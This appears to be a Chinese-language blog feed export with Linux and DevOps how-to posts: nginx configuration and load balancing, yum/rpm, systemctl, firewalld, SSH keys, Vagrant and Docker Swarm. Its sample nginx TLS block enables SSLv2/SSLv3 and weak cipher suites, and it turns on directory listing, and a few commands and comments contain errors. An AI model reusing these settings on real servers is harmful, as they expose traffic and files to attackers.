href="#其他资源" class="headerlink" title="其他资源"></a>其他资源</h2><p>还有一些资源辅助在写作过程中可能需要用到。</p><h3 id="Markdown-专用样式库"><a href="#Markdown-专用样式库" class="headerlink" title="Markdown 专用样式库"></a>Markdown 专用样式库</h3><ul><li><a href="http://markedstyle.com/styles" target="_blank" rel="noopener">http://markedstyle.com/styles</a></li></ul><h3 id="多平台文章发布器"><a href="#多平台文章发布器" class="headerlink" title="多平台文章发布器"></a>多平台文章发布器</h3><p>有一些开源的工具，但是做的都不是很好,收费的好用一点</p><ul><li>简媒 <a href="https://www.8qwe5.com" target="_blank" rel="noopener">https://www.8qwe5.com</a></li></ul><h3 id="图标库"><a href="#图标库" class="headerlink" title="图标库"></a>图标库</h3><ul><li>一套扁平的图标库资源  <a href="https://www.flaticon.com" target="_blank" rel="noopener">https://www.flaticon.com</a> </li><li>阿里的图标库 <a href="https://www.iconfont.cn/" target="_blank" rel="noopener">https://www.iconfont.cn/</a></li></ul><h3 id="字体"><a href="#字体" class="headerlink" title="字体"></a>字体</h3><ul><li>推荐使用思源黑体,Google 开源的免费中文简体字体 <a href="https://fonts.adobe.com/fonts/source-han-sans-simplified-chinese" target="_blank" rel="noopener">https://fonts.adobe.com/fonts/source-han-sans-simplified-chinese</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 写作技巧 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Nginx 配置参数说明</title>
      <link href="/linux/linux/ngnix-conf/"/>
      <url>/linux/linux/ngnix-conf/</url>
      
        <content type="html"><![CDATA[<h2 id="一份基本的-ngnix-conf"><a href="#一份基本的-ngnix-conf" class="headerlink" title="一份基本的 ngnix.conf"></a>一份基本的 ngnix.conf</h2><pre><code>#定义Nginx运行的用户和用户组user www www;##nginx进程数,建议设置为等于CPU总核心数.worker_processes 8;##全局错误日志定义类型,[ debug | info | notice | warn | error | crit ]error_log /var/log/nginx/error.log info;##进程文件pid /var/run/nginx.pid;##一个nginx进程打开的最多文件描述符数目,理论值应该是最多打开文件数（系统的值ulimit -n）与nginx进程数相除,但是nginx分配请求并不均匀,所以建议与ulimit -n的值保持一致.worker_rlimit_nofile 65535;##工作模式与连接数上限events{    #参考事件模型,use [ kqueue | rtsig | epoll | /dev/poll | select | poll ]; epoll模型是Linux 2.6以上版本内核中的高性能网络I/O模型,如果跑在FreeBSD上面,就用kqueue模型.    use epoll;    #单个进程最大连接数（最大连接数=连接数*进程数）    worker_connections 65535;}##设定http服务器http{    include mime.types; #文件扩展名与文件类型映射表    default_type application/octet-stream; #默认文件类型    #charset utf-8; #默认编码    server_names_hash_bucket_size 128; #服务器名字的hash表大小    client_header_buffer_size 32k; #上传文件大小限制    large_client_header_buffers 4 64k; #设定请求缓    client_max_body_size 8m; #设定请求缓    # 开启目录列表访问,合适下载服务器,默认关闭.    autoindex on;                   # 显示目录    autoindex_exact_size on;        # 显示文件大小 默认为on,显示出文件的确切大小,单位是bytes 改为off后,显示出文件的大概大小,单位是kB或者MB或者GB    autoindex_localtime on;         # 显示文件时间 默认为off,显示的文件时间为GMT时间 改为on后,显示的文件时间为文件的服务器时间    sendfile on; # 开启高效文件传输模式,sendfile指令指定nginx是否调用sendfile函数来输出文件,对于普通应用设为 on,如果用来进行下载等应用磁盘IO重负载应用,可设置为off,以平衡磁盘与网络I/O处理速度,降低系统的负载.注意：如果图片显示不正常把这个改成off.    tcp_nopush on; # 防止网络阻塞    tcp_nodelay on; # 防止网络阻塞    keepalive_timeout 120; # (单位s)设置客户端连接保持活动的超时时间,在超过这个时间后服务器会关闭该链接    # FastCGI相关参数是为了改善网站的性能：减少资源占用,提高访问速度.下面参数看字面意思都能理解.    fastcgi_connect_timeout 300;    fastcgi_send_timeout 300;    fastcgi_read_timeout 300;    fastcgi_buffer_size 64k;    fastcgi_buffers 4 64k;    fastcgi_busy_buffers_size 128k;    fastcgi_temp_file_write_size 128k;    # gzip模块设置    gzip on; #开启gzip压缩输出    gzip_min_length 1k; #允许压缩的页面的最小字节数,页面字节数从header偷得content-length中获取.默认是0,不管页面多大都进行压缩.建议设置成大于1k的字节数,小于1k可能会越压越大    gzip_buffers 4 16k; #表示申请4个单位为16k的内存作为压缩结果流缓存,默认值是申请与原始数据大小相同的内存空间来存储gzip压缩结果    gzip_http_version 1.1; #压缩版本（默认1.1,目前大部分浏览器已经支持gzip解压.前端如果是squid2.5请使用1.0）    gzip_comp_level 2; #压缩等级.1压缩比最小,处理速度快.9压缩比最大,比较消耗cpu资源,处理速度最慢,但是因为压缩比最大,所以包最小,传输速度快    gzip_types text/plain application/x-javascript text/css application/xml;    #压缩类型,默认就已经包含text/html,所以下面就不用再写了,写上去也不会有问题,但是会有一个warn.    gzip_vary on;#选项可以让前端的缓存服务器缓存经过gzip压缩的页面.例如:用squid缓存经过nginx压缩的数据    #开启限制IP连接数的时候需要使用    #limit_zone crawler $binary_remote_addr 10m;    ##upstream的负载均衡,四种调度算法(下例主讲)##    #虚拟主机的配置    server    {        # 监听端口        listen 80;        # 域名可以有多个,用空格隔开        server_name ably.com;        # HTTP 自动跳转 HTTPS        rewrite ^(.*) https://$server_name$1 permanent;    }    server    {        # 监听端口 HTTPS        listen 443 ssl;        server_name ably.com;        # 配置域名证书        ssl_certificate      C:\WebServer\Certs\certificate.crt;        ssl_certificate_key  C:\WebServer\Certs\private.key;        ssl_session_cache    shared:SSL:1m;        ssl_session_timeout  5m;        ssl_protocols SSLv2 SSLv3 TLSv1;        ssl_ciphers ALL:!ADH:!EXPORT56:RC4+RSA:+HIGH:+MEDIUM:+LOW:+SSLv2:+EXP;        ssl_prefer_server_ciphers  on;        index index.html index.htm index.php;        root /data/www/;        location ~ .*\.(php|php5)?$        {            fastcgi_pass 127.0.0.1:9000;            fastcgi_index index.php;            include fastcgi.conf;        }        # 配置地址拦截转发，解决跨域验证问题        location /oauth/{            proxy_pass https://localhost:13580/oauth/;            proxy_set_header HOST $host;            proxy_set_header X-Real-IP $remote_addr;            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;        }        # 图片缓存时间设置        location ~ .*\.(gif|jpg|jpeg|png|bmp|swf)$ {            expires 10d;        }        # JS和CSS缓存时间设置        location ~ .*\.(js|css)?$ {            expires 1h;        }        # 日志格式设定        log_format access &#39;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &#39;        &#39;$status $body_bytes_sent &quot;$http_referer&quot; &#39;        &#39;&quot;$http_user_agent&quot; $http_x_forwarded_for&#39;;        # 定义本虚拟主机的访问日志        access_log /var/log/nginx/access.log access;        # 设定查看Nginx状态的地址.StubStatus模块能够获取Nginx自上次启动以来的工作状态，此模块非核心模块，需要在Nginx编译安装时手工指定才能使用        location /NginxStatus {            stub_status on;            access_log on;            auth_basic &quot;NginxStatus&quot;;            auth_basic_user_file conf/htpasswd;            #htpasswd文件的内容可以用apache提供的htpasswd工具来产生.        }    }}</code></pre><h2 id="负载均衡配置"><a href="#负载均衡配置" class="headerlink" title="负载均衡配置"></a>负载均衡配置</h2><pre><code>events{    use epoll;    worker_connections 65535;}http{    ##upstream的负载均衡,四种调度算法##    #调度算法1:轮询.每个请求按时间顺序逐一分配到不同的后端服务器,如果后端某台服务器宕机,故障系统被自动剔除,使用户访问不受影响    upstream webhost {        server 192.168.0.5:6666 ;        server 192.168.0.7:6666 ;    }    #调度算法2:weight(权重).可以根据机器配置定义权重.权重越高被分配到的几率越大    upstream webhost {        server 192.168.0.5:6666 weight=2;        server 192.168.0.7:6666 weight=3;    }    #调度算法3:ip_hash. 每个请求按访问IP的hash结果分配,这样来自同一个IP的访客固定访问一个后端服务器,有效解决了动态网页存在的session共享问题    upstream webhost {        ip_hash;        server 192.168.0.5:6666 ;        server 192.168.0.7:6666 ;    }    #调度算法4:url_hash(需安装第三方插件).此方法按访问url的hash结果来分配请求,使每个url定向到同一个后端服务器,可以进一步提高后端缓存服务器的效率.Nginx本身是不支持url_hash的,如果需要使用这种调度算法,必须安装Nginx 的hash软件包    upstream webhost {        server 192.168.0.5:6666 ;        server 192.168.0.7:6666 ;        hash $request_uri;    }    #调度算法5:fair(需安装第三方插件).这是比上面两个更加智能的负载均衡算法.此种算法可以依据页面大小和加载时间长短智能地进行负载均衡,也就是根据后端服务器的响应时间来分配请求,响应时间短的优先分配.Nginx本身是不支持fair的,如果需要使用这种调度算法,必须下载Nginx的upstream_fair模块    #    #虚拟主机的配置(采用调度算法3:ip_hash)    server    {        listen  80;        server_name  mongo.demo.com;        #对 &quot;/&quot; 启用反向代理        location / {            proxy_pass http://webhost;            proxy_redirect off;            proxy_set_header X-Real-IP $remote_addr;            #后端的Web服务器可以通过X-Forwarded-For获取用户真实IP            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;            #以下是一些反向代理的配置,可选.            proxy_set_header Host $host;            client_max_body_size 10m; #允许客户端请求的最大单文件字节数            client_body_buffer_size 128k; #缓冲区代理缓冲用户端请求的最大字节数,            proxy_connect_timeout 90; #nginx跟后端服务器连接超时时间(代理连接超时)            proxy_send_timeout 90; #后端服务器数据回传时间(代理发送超时)            proxy_read_timeout 90; #连接成功后,后端服务器响应时间(代理接收超时)            proxy_buffer_size 4k; #设置代理服务器（nginx）保存用户头信息的缓冲区大小            proxy_buffers 4 32k; #proxy_buffers缓冲区,网页平均在32k以下的设置            proxy_busy_buffers_size 64k; #高负荷下缓冲大小（proxy_buffers*2）            proxy_temp_file_write_size 64k;            #设定缓存文件夹大小,大于这个值,将从upstream服务器传        }    }}</code></pre><p>一份 ip_hash 的配置文件</p><pre><code># 创建文件夹准备存放配置文件$ mkdir -p /opt/confs$ vim /opt/confs/nginx.conf# 编辑内容如下：events{  use epoll;  worker_connections 65535;}http{    upstream webhost {        ip_hash;        server 192.168.0.5:6666 ;        server 192.168.0.7:6666 ;    }    server    {        listen  80;        server_name  mongo.demo.com;        location / {            proxy_pass http://webhost;            proxy_redirect off;            proxy_set_header X-Real-IP $remote_addr;            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;            proxy_set_header Host $host;            client_max_body_size 10m;            client_body_buffer_size 128k;            proxy_connect_timeout 90;            proxy_send_timeout 90;            proxy_read_timeout 90;            proxy_buffer_size 4k;            proxy_buffers 4 32k;            proxy_busy_buffers_size 64k;            proxy_temp_file_write_size 64k;        }    }}# 然后保存并退出# 启动负载均衡服务器192.168.0.4（Nginx-Server）docker run -d -p 8888:80 --name nginx-server -v /opt/confs/nginx.conf:/etc/nginx/nginx.conf --restart always nginx</code></pre><blockquote><p>动态更新 upstream 需要配合 Consul 作为服务注册和发现系统完成。</p></blockquote><h2 id="相关资料"><a href="#相关资料" class="headerlink" title="相关资料"></a>相关资料</h2><ul><li><a href="https://blog.csdn.net/jek123456/article/details/68059358" target="_blank" rel="noopener">https://blog.csdn.net/jek123456/article/details/68059358</a></li><li><a href="https://segmentfault.com/a/1190000005789137" target="_blank" rel="noopener">https://segmentfault.com/a/1190000005789137</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>rpm 和 yum 包管理器的使用</title>
      <link href="/linux/linux/linux-rpm-installation/"/>
      <url>/linux/linux/linux-rpm-installation/</url>
      
        <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>rpm 是 RedHat 的包管理工具，因此叫 RedHat Package Manager，但由于目前 rpm 非常流行，基本上已经是事实标准。</p><p>rpm 包适用于 Fedora, CentOS, Red Hat Enterprise Linux, OpenSUSE, Mandriva, PCLinuxOS 等操作系。和 rpm 类似的是 deb 包。</p><p>尤其是 CentOS 用的比较多, rpm 比较有用。另外在 CentOS 有另外一个工具 yum。</p><ul><li>rpm，底层工具用来安装和删除软件包文件</li><li>yum，上层工具完成元数据搜索和依赖解析</li></ul><p>两种工具都可以，完成软件的安装。</p><blockquote><p>yum install package_name<br>rpm -i package_file</p></blockquote><p>不同之处在于，rpm 需要自己下载软件包并且安装，如果依赖不满足可能报错。yum 会从资源库（repo）中搜索安装，并自动解决依赖问题。</p><h2 id="推荐的安装方式"><a href="#推荐的安装方式" class="headerlink" title="推荐的安装方式"></a>推荐的安装方式</h2><p>所以我们一般使用 yum 安装，如果资源库中没有，软件的官网往往提供了 repo，我们可以导入然后使用 yum 安装。</p><p>Jenkins 的安装页面，提供如下的安装方式</p><p>下载 repo 描述文件</p><blockquote><p>sudo wget -O /etc/yum.repos.d/jenkins.repo <a href="https://pkg.jenkins.io/redhat-stable/jenkins.repo" target="_blank" rel="noopener">https://pkg.jenkins.io/redhat-stable/jenkins.repo</a></p></blockquote><p>导入 repo 信息</p><blockquote><p>sudo rpm –import <a href="https://pkg.jenkins.io/redhat-stable/jenkins.io.key" target="_blank" rel="noopener">https://pkg.jenkins.io/redhat-stable/jenkins.io.key</a></p></blockquote><p>使用 yum 安装</p><blockquote><p>yum install jenkins</p></blockquote><p>我们在编写安装脚本的时候，推荐使用这种安装方式，基本上能解决大部分的软件安装，又容易管理。</p><p><a href="https://pkg.jenkins.io/redhat-stable/" target="_blank" rel="noopener">https://pkg.jenkins.io/redhat-stable/</a></p><h2 id="Linux-包安装方式"><a href="#Linux-包安装方式" class="headerlink" title="Linux 包安装方式"></a>Linux 包安装方式</h2><ul><li>yum，默认仓库有安装包时</li><li>yum + rpm，软件包提供了自己的 repo 时</li><li>rpm，找不到 repo 时</li><li>源代码编译或使用通用二进制方式</li></ul>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Intellij 常用技巧</title>
      <link href="/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/tool/idea-skills/"/>
      <url>/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/tool/idea-skills/</url>
      
        <content type="html"><![CDATA[<h2 id="使用-Hierarchy-分析类的关系"><a href="#使用-Hierarchy-分析类的关系" class="headerlink" title="使用 Hierarchy 分析类的关系"></a>使用 Hierarchy 分析类的关系</h2><p>我们用工具 IntelliJ IDEA， 打开任意类，单击 Navigate → Type Hierarchy。然后我们会得到下面视图。</p><p><img src="/开发工具/tool/idea-skills/idea-hierarchy.jpg" alt="Hierarchy"></p><p>使用 Hierarchy 对我们分析源码有非常大的帮助。</p><h2 id="使用-Diagrams-查看类图"><a href="#使用-Diagrams-查看类图" class="headerlink" title="使用 Diagrams 查看类图"></a>使用 Diagrams 查看类图</h2><p>使用工具 Intellij IDEA，打开任意类（有复杂继承关系的类或者接口），在文件上右击，选择 show diagrams，可以看到类的关系层次。这里以 CurdRepository 为例，显示类图如下。</p><p><img src="/开发工具/tool/idea-skills/idea-diagram.png" alt="类图"></p>]]></content>
      
      
      <categories>
          
          <category> 开发工具 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>系统服务管理 systemctl</title>
      <link href="/linux/linux/linux-systemctl/"/>
      <url>/linux/linux/linux-systemctl/</url>
      
        <content type="html"><![CDATA[<h2 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h2><p>systemctl 设计目标是为系统的启动和管理提供一套完整的解决方案。</p><h2 id="操作方法"><a href="#操作方法" class="headerlink" title="操作方法"></a>操作方法</h2><p>查看版本号 </p><blockquote><p>systemctl –version</p></blockquote><p>管理系统</p><pre><code># 重启系统$ sudo systemctl reboot# 关闭系统，切断电源$ sudo systemctl poweroff# CPU停止工作$ sudo systemctl halt# 暂停系统$ sudo systemctl suspend# 让系统进入冬眠状态$ sudo systemctl hibernate# 让系统进入交互式休眠状态$ sudo systemctl hybrid-sleep# 启动进入救援状态（单用户状态）$ sudo systemctl rescue</code></pre><p>  管理服务 (平时用的最多的)</p><pre><code># 立即启动一个服务$ sudo systemctl start apache.service# 立即停止一个服务$ sudo systemctl stop apache.service# 重启一个服务$ sudo systemctl restart apache.service# 杀死一个服务的所有子进程$ sudo systemctl kill apache.service# 重新加载一个服务的配置文件$ sudo systemctl reload apache.service# 重载所有修改过的配置文件$ sudo systemctl daemon-reload# 显示某个 Unit 的所有底层参数$ systemctl show httpd.service# 显示某个 Unit 的指定属性的值$ systemctl show -p CPUShares httpd.service# 设置某个 Unit 的指定属性$ sudo systemctl set-property httpd.service CPUShares=500</code></pre><h2 id="相关资料"><a href="#相关资料" class="headerlink" title="相关资料"></a>相关资料</h2><ul><li><a href="http://www.ruanyifeng.com/blog/2016/03/systemd-tutorial-commands.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2016/03/systemd-tutorial-commands.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>防火墙暴露端口</title>
      <link href="/linux/linux/linux-fire-wall/"/>
      <url>/linux/linux/linux-fire-wall/</url>
      
        <content type="html"><![CDATA[<h2 id="操作方法"><a href="#操作方法" class="headerlink" title="操作方法"></a>操作方法</h2><p>开启端口 </p><blockquote><p>sudo firewall-cmd –zone=public –add-port=80/tcp –permanent</p></blockquote><p>命令含义：</p><p>–zone #作用域</p><p>–add-port=80/tcp  #添加端口，格式为：端口/通讯协议</p><p>–permanent  #永久生效，没有此参数重启后失效</p><p>重启防火墙 </p><blockquote><p>sudo firewall-cmd –reload</p></blockquote><h2 id="相关资料"><a href="#相关资料" class="headerlink" title="相关资料"></a>相关资料</h2><ul><li><a href="https://blog.csdn.net/qq_27870421/article/details/93165382" target="_blank" rel="noopener">https://blog.csdn.net/qq_27870421/article/details/93165382</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>使用和生成 SSH key 登录 Linux 服务器</title>
      <link href="/linux/linux/linux-gen-ssh-key/"/>
      <url>/linux/linux/linux-gen-ssh-key/</url>
      
        <content type="html"><![CDATA[<h2 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h2><p>基本原理为服务器持有公钥，客户端持有私钥。服务器 authorized_keys 中允许添加多个公钥，则允许多个持有私钥的客户端登陆上来。客户端生成密匙对，然后讲公钥文件注册到 authorized_keys 即可登录。</p><h2 id="操作方法"><a href="#操作方法" class="headerlink" title="操作方法"></a>操作方法</h2><p>在客户端打开控制台，输入命令</p><blockquote><p>ssh-keygen -t rsa</p></blockquote><p>Enter file in which to save the key (/home/hp/.ssh/id_rsa): </p><p>输入生成 key 的位置</p><p>选择默认选项的话，可以在指定的位置得到 id_rsa  id_rsa.pub 两个文件。<br>，id_rsa 私钥，id_rsa.pub 为公钥，公钥为服务器持有，私钥为客户端登录上来的凭证。</p><p>需要把公钥添加到系统的密匙文件中，才能启用公钥。</p><blockquote><p>cat ~/.ssh/id_rsa.pub &gt;&gt; ~/.ssh/authorized_keys </p></blockquote><p>完成上面的步骤后，即可使用下面的命令登录：</p><blockquote><p>ssh -i id_rsa username@host</p></blockquote><p>注意</p><ul><li>如果密匙对是在服务器上生成的，可以吧 id_rsa 文件拷贝到本机 ./ssh/ 下即可登录。</li><li>如果本机已经存在 id_rsa 文件，为了不影响登录其他服务，可以直接把存在的 id_rsa.pub 拷贝到 authorized_keys 即可登录。</li></ul><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Linux 虚拟机管理 Vagrant</title>
      <link href="/linux/linux/vagrant/"/>
      <url>/linux/linux/vagrant/</url>
      
        <content type="html"><![CDATA[<h2 id="虚拟机管理工具"><a href="#虚拟机管理工具" class="headerlink" title="虚拟机管理工具"></a>虚拟机管理工具</h2><p>在 window 上下载安装包安装即可，在 Mac 上使用 brew 安装</p><p>安装 VisualBox</p><blockquote><p>brew install caskroom/cask/virtualbox</p></blockquote><p>安装 Vagrant</p><blockquote><p>brew install caskroom/cask/vagrant</p></blockquote><p>可以去 <a href="http://www.vagrantbox.es/" target="_blank" rel="noopener">http://www.vagrantbox.es/</a>  下载 Vagrant 封装好的镜像，然后直接导入，否则自己下载镜像配置。</p><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><p>添加虚拟机</p><p>可以在 <a href="https://app.vagrantup.com/boxes/search" target="_blank" rel="noopener">https://app.vagrantup.com/boxes/search</a> 上寻找和下载 virtualbox 文件</p><blockquote><p>vagrant box add centos7 /Users/nlin/www/env/centos-7.0-x86_64.box</p></blockquote><p>初始化虚拟机，如果未添加虚拟机文件会自动从仓库里下载，第一次初始化会生成一个 Vagrantfile 文件用于管理素所有命令操作后的变化，利于版本管理:</p><blockquote><p>vagrant init centos7  </p></blockquote><p>vagrant box add 添加时可以给一个不同的名称，用于启动多个虚拟机,这里设置一个 manager 用于 swarm manager:</p><blockquote><p>vagrant box add manager /Users/nlin/www/env/centos-7.0-x86_64.box<br>vagrant init manager</p></blockquote><p>启动虚拟机</p><blockquote><p>vagrant up</p></blockquote><p>查看当前运行的虚拟机</p><blockquote><p>vagrant box list</p></blockquote><p>进入虚拟机</p><blockquote><p>vagrant ssh</p></blockquote><p>更多有用命令</p><blockquote><p>vagrant -h</p></blockquote><p>一份整理好的 vagrant 文件</p><pre><code># -*- mode: ruby -*-# vi: set ft=ruby :$setup_jenkins_server = &lt;&lt;SCRIPTsudo yum -y install ansiblesudo yum -y install gitsudo chown -R ansible /vagrantSCRIPT$setup_ansible_user = &lt;&lt;SCRIPTsudo useradd ansible --groups vagrantsudo mkdir -p /home/ansible/.ssh/ &amp;&amp; sudo cp -rf /home/vagrant/.ssh/authorized_keys /home/ansible/.ssh/authorized_keyssudo chown -R ansible /home/ansible/.sshsudo chmod 600 /home/ansible/.ssh/authorized_keysSCRIPTVagrant.configure(2) do |config|  config.vm.box = &quot;centos/7&quot;  config.vm.provider &quot;virtualbox&quot; do |v|    v.memory = 1024  end  config.vm.box_check_update = false  VAGRANT_COMMAND = ARGV[0]  if VAGRANT_COMMAND == &quot;ssh&quot;    config.ssh.username = &#39;ansible&#39;  end  config.vm.define &quot;jenkins-server&quot; do |dev|    config.vm.synced_folder &quot;.&quot;, &quot;/vagrant&quot;    dev.vm.network &quot;private_network&quot;, ip: &quot;10.132.112.10&quot;    dev.vm.hostname = &quot;jenkins-server&quot;    dev.vm.provision :shell, inline: $setup_ansible_user    dev.vm.provision :shell, inline: $setup_jenkins_server  end  config.vm.define &quot;jenkins-agent-1&quot; do |dev|    dev.vm.network &quot;private_network&quot;, ip: &quot;10.132.112.11&quot;    dev.vm.hostname = &quot;jenkins-agent&quot;    dev.vm.provision :shell, inline: $setup_ansible_user  end  config.vm.define &quot;manager1&quot; do |dev|    config.vm.provider &quot;virtualbox&quot; do |v|      v.memory = 2048    end    dev.vm.network &quot;private_network&quot;, ip: &quot;10.132.112.21&quot;    dev.vm.hostname = &quot;manager1&quot;    dev.vm.provision :shell, inline: $setup_ansible_user    # dev.vm.network :forwarded_port, guest: 80, host: 9080  end   config.vm.define &quot;manager2&quot; do |dev|     config.vm.provider &quot;virtualbox&quot; do |v|       v.memory = 2048     end     dev.vm.network &quot;private_network&quot;, ip: &quot;10.132.112.22&quot;     dev.vm.hostname = &quot;manager2&quot;     dev.vm.provision :shell, inline: $setup_ansible_user   end  config.vm.define &quot;worker1&quot; do |dev|    dev.vm.network &quot;private_network&quot;, ip: &quot;10.132.112.23&quot;    dev.vm.hostname = &quot;worker1&quot;    dev.vm.provision :shell, inline: $setup_ansible_user  end  config.vm.define &quot;worker2&quot; do |dev|    dev.vm.network &quot;private_network&quot;, ip: &quot;10.132.112.24&quot;    dev.vm.hostname = &quot;worker2&quot;    dev.vm.provision :shell, inline: $setup_ansible_user  endend</code></pre><p>只需要创建文件 Vagrantfile 并粘贴上面内容，然后运行：</p><blockquote><p>vagrant up</p></blockquote><p>可以快速的创建一组虚拟机。启动成功后，运行 provision 命令初始化 ansible 以及 docker 等基本工具。</p><p>服务器上的 Jenkins 机器需要自己手动安装 ansible 以及 git， 最好配置一个 ansible user，否则修改 hosts 中 ansible_user 使用 root 用户连接。</p><blockquote><p>yum -y install ansible<br>yum -y install git</p></blockquote><p>其他机器全部使用 ansible 来操作。</p><h2 id="参考资源"><a href="#参考资源" class="headerlink" title="参考资源"></a>参考资源</h2><ul><li>官方文档 <a href="https://www.vagrantup.com/docs/index.html" target="_blank" rel="noopener">https://www.vagrantup.com/docs/index.html</a></li><li>安装方法 <a href="https://blog.csdn.net/yanyan42/article/details/79697659" target="_blank" rel="noopener">https://blog.csdn.net/yanyan42/article/details/79697659</a></li><li>一个快速上手教程 <a href="https://www.jianshu.com/p/7e8f61376053" target="_blank" rel="noopener">https://www.jianshu.com/p/7e8f61376053</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Swarm</title>
      <link href="/docker/docker/swarm/"/>
      <url>/docker/docker/swarm/</url>
      
        <content type="html"><![CDATA[<p>Docker 官方容器编排工具。</p><p>Docker 编排的几种模式</p><ul><li>Docker for desktop </li><li>Swarm 官方的编排工具</li><li>K8s 社区最火的编排工具</li></ul><h2 id="Swarm-相关概念"><a href="#Swarm-相关概念" class="headerlink" title="Swarm 相关概念"></a>Swarm 相关概念</h2><h3 id="节点"><a href="#节点" class="headerlink" title="节点"></a>节点</h3><p>安装了 Docker 的一个物理机或者虚拟机，节点分为管理节点和工作节点。</p><p>管理节点分为 Leader 和 follower，管理节点最好是奇数。他们之间会自动选举，leader，生产上不建议将管理节点和工作节点放到一台服务器上。</p><h3 id="Stack"><a href="#Stack" class="headerlink" title="Stack"></a>Stack</h3><p>Stack 指一个应用需要的一整套容器，例如前端、后端API、BFF等，由多个 service 构成。</p><h3 id="Service"><a href="#Service" class="headerlink" title="Service"></a>Service</h3><p>一个 Service 指一个 docker compose运行后的一个服务，可以存在多个容器的副本</p><h3 id="Image"><a href="#Image" class="headerlink" title="Image"></a>Image</h3><p>一个Docker镜像</p><h3 id="network"><a href="#network" class="headerlink" title="network"></a>network</h3><p>容器的网络和虚拟机的网络概念上类似，桥接模式、host模式，但是非常重要的一个网络模式是overlay。类似于网络中的 VLAN，可以在不同容器之间建立一个虚拟网络。</p><h3 id="Volumes"><a href="#Volumes" class="headerlink" title="Volumes"></a>Volumes</h3><p>容器运行需要的存储空间。</p><h2 id="docker-swarm-常见命令"><a href="#docker-swarm-常见命令" class="headerlink" title="docker swarm 常见命令"></a>docker swarm 常见命令</h2><h3 id="查看运行的-service"><a href="#查看运行的-service" class="headerlink" title="查看运行的 service"></a>查看运行的 service</h3><blockquote><p>docker service list </p></blockquote><h3 id="查看某个日志"><a href="#查看某个日志" class="headerlink" title="查看某个日志"></a>查看某个日志</h3><blockquote><p>docker service logs [servicename]</p></blockquote><h2 id="搭建-swarm-集群实战"><a href="#搭建-swarm-集群实战" class="headerlink" title="搭建 swarm 集群实战"></a>搭建 swarm 集群实战</h2><p>在本机练习可以使用 docker-machine 来创建数台虚拟机练习网络。</p><p>使用 docker-machine 创建一个虚拟机，最好使用 virtualbox 作为虚拟机管理工具。当然也可以使用 vagrant 作为虚拟机管理工具。</p><blockquote><p>docker-machine create –driver virtualbox manager1</p></blockquote><pre><code>Running pre-create checks...(manager1) No default Boot2Docker ISO found locally, downloading the latest release...(manager1) Latest release for github.com/boot2docker/boot2docker is v19.03.5(manager1) Downloading /Users/nlin/.docker/machine/cache/boot2docker.iso from https://github.com/boot2docker/boot2docker/releases/download/v19.03.5/boot2docker.iso...(manager1) 0%....10%....20%....30%....40%....50%....60%....70%....80%....90%....100%Creating machine...(manager1) Copying /Users/nlin/.docker/machine/cache/boot2docker.iso to /Users/nlin/.docker/machine/machines/manager1/boot2docker.iso...(manager1) Creating VirtualBox VM...(manager1) Creating SSH key...(manager1) Starting the VM...(manager1) Check network to re-create if needed...(manager1) Found a new host-only adapter: &quot;vboxnet0&quot;(manager1) Waiting for an IP...Waiting for machine to be running, this may take a few minutes...Detecting operating system of created instance...Waiting for SSH to be available...Detecting the provisioner...Provisioning with boot2docker...Copying certs to the local machine directory...Copying certs to the remote machine...Setting Docker configuration on the remote daemon...Checking connection to Docker...Docker is up and running!To see how to connect your Docker Client to the Docker Engine running on this virtual machine, run: docker-machine env manager1</code></pre><p>这个阶段耗时比较长，创建成功之后可以使用 docker-machine env 命令查看虚拟机信息，这个过程可能需要翻墙才能成功拉取镜像。</p><blockquote><p>docker-machine env manager1</p></blockquote><pre><code>export DOCKER_TLS_VERIFY=&quot;1&quot;export DOCKER_HOST=&quot;tcp://192.168.99.100:2376&quot;export DOCKER_CERT_PATH=&quot;/Users/nlin/.docker/machine/machines/manager1&quot;export DOCKER_MACHINE_NAME=&quot;manager1&quot;# Run this command to configure your shell: # eval $(docker-machine env manager1)</code></pre><p>使用  docker-machine ls 可以查看运行的虚拟机</p><blockquote><p>docker-machine ls</p></blockquote><pre><code>NAME       ACTIVE   DRIVER       STATE     URL                         SWARM   DOCKER     ERRORSmanager1   -        virtualbox   Running   tcp://192.168.99.100:2376           v19.03.5   </code></pre><p>再创建一个虚拟机，作为 swarm 的 worker</p><blockquote><p>docker-machine create –driver virtualbox manager1</p></blockquote><p>现在有两台机器了，在 manager 中初始化集群。</p><blockquote><p>docker-machine ssh manager1 docker swarm init –listen-addr 192.168.99.100:2337 –advertise-addr 192.168.99.100</p></blockquote><p>会得到一个集群的 token ，使用这个 token 可以进行后续的操作。</p><pre><code>Swarm initialized: current node (ifzgulv2nsw5r84dw55f8vut0) is now a manager.To add a worker to this swarm, run the following command:    docker swarm join --token SWMTKN-1-57k8uubh350ppnb68p4jjqmyp6nu4x2ziu8mf2ocmpqsojvc6s-5j94cvq03w9phk6vid7mgsyq4 192.168.99.100:2337To add a manager to this swarm, run &#39;docker swarm 